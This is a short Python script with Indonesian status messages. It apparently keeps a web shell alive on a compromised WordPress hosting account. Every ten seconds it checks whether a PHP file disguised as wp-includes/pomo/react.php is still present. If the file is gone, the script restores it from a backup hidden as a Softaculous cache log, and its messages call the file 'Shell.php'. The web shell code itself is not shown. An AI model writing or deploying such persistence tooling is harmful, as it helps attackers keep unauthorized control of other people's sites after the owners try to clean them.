import shutil
import os
import time

backup_php = "/home2/foxlogde/.softaculous/.cache/logs.php"
restore_path = "/home2/foxlogde/public_html/wp-includes/pomo/react.php"

while True:
    if not os.path.exists(restore_path):
        shutil.copy2(backup_php, restore_path)
        print("Shell.php berhasil di-restore ke public_html.")
    else:
        print("Shell.php masih ada, tidak perlu restore.")
    
    time.sleep(10)  # delay 10 detik
